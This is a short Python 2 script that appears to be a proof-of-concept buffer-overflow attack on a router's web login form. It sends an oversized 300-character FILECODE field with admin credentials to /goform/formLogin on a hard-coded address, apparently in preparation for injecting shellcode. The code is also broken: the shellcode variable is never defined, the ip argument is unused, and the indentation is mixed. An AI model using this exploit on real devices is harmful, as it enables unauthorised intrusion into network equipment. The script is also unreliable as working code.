import requests
import sys
import struct
import string
import base64
def login(shellcode,user,password,ip):
	postData = {
	'login_name':'yuanshuo',
	'curTime':"12345",
	'FILECODE':"a"*300,
	'VER_CODE':'vercode',
	'VERIFICATION_CODE':'12345',
	'login_n':user,
	'login_pass':password,
	}
	response = requests.post('http://192.168.1.1/goform/formLogin',data=postData)
        
        #print 'http://' + ip + '/goform/formLogin'
        print response.json


if __name__ == "__main__":
	login(shellcode,'admin', base64.b64encode('shuoshuo110'),'192.168.1.1')
